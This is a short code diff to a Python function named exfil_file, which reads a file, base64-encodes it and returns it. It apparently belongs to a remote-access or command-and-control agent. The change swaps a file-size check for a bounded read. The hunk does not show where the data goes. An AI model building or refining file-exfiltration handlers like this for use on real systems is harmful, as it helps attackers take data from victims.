@@ -148,14 +148,14 @@ def exfil_file(args):
     if not path: 
         return {"status": "error", "message": "path is required"}
     
-    MAX_FILE_SIZE = 5 * 1024 * 1024 #max of 5MB for now
-    
-    if os.path.getsize(path) > MAX_FILE_SIZE:
-        return {"status": "error", "message": "File too large"}
-    
+    MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB
+
     try:
         with open(path, "rb") as f:
-            data = f.read()
+            data = f.read(MAX_FILE_SIZE + 1)
+
+        if len(data) > MAX_FILE_SIZE:
+            return {"status": "error", "message": "File too large"}
             
         import base64
         encoded = base64.b64encode(data).decode()
